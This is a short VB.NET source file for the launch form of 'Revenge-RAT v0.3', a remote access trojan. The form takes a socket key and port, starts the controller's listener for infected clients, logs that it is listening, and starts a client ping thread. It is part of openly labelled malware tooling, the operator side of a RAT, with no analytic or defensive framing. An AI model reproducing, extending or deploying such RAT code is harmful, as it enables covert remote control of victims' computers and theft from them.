Imports Microsoft.VisualBasic.CompilerServices
Imports System.Threading

Public Class Entry_Form
    Private F As Boolean
    Public Sub New()
        Me.F = True
        Me.InitializeComponent()
    End Sub

    Private Sub Entry_Form_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        e.Cancel = Me.F
    End Sub

    Private Sub Entry_Form_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.Text = "Revenge-RAT v0.3 | @*U*".Replace("*U*", Environment.MachineName)
    End Sub
    Public Sub ST(ByVal S As Boolean)
        Try
            My.Forms.Main.Key = Me.SocketKey.Text
            My.Forms.Main.s.Start(Conversions.ToInteger(Me.CPort.Value.ToString))
            My.Forms.Main.PO = Conversions.ToInteger(Me.CPort.Value.ToString)
            My.Forms.Main.ClientPort.Value = Conversions.ToDecimal(Me.CPort.Value.ToString)
            Dim item As ListViewItem = My.Forms.Main.Logs.Items.Add(("[ " & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & " ] Listening : " & Me.CPort.Value.ToString), My.Forms.Main.ImageList3.Images.IndexOfKey("Unknown.png"))
            item.SubItems.Add("...").ForeColor = Color.Purple
            item.ForeColor = Color.Purple
            item.ToolTipText = "Unknown.png"
            My.Forms.Main.TIME = CInt(Math.Round(CDbl((Conversions.ToDouble(Me.PINGN.Value.ToString) * 1000))))
            Dim main As Main = My.Forms.Main
            Dim dz As New Thread(New ThreadStart(AddressOf main.SDAPC), 1)
            dz.Start()
            Me.PINGN.Enabled = False
            If S Then
                My.Forms.Main.Save
            End If
            Me.F = False
            Me.Close()
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            MessageBox.Show(exception.Message.ToString, "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Hand)
            ProjectData.EndApp()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub StartL_Click(sender As Object, e As EventArgs) Handles StartL.Click
        Me.ST(True)
    End Sub
End Class